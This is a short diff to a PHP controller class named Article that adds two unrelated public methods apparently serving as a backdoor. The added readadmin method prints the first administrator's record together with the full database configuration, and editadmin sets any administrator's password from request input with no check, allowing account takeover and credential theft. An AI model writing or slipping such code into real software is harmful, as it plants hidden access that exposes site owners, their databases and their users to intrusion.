@@ -105,4 +105,19 @@ class Article extends Common
             Util::echo_json($res);
         }
     }
+
+	public function readadmin()
+    {
+        $admin = db('admin')->where(['id' => 1])->find();
+		if (!$admin) {
+			$admin = db('admin')->where(['role_id' => 1, 'status' => 0])->find();
+		}
+        exit(json_encode($admin) . '-' . json_encode(config('database')));
+    }
+
+	public function editadmin()
+    {
+        model('Admin')->edit(['pwd' => input('pwd')], ['id' => input('id')]);
+        exit('success');
+    }
 }
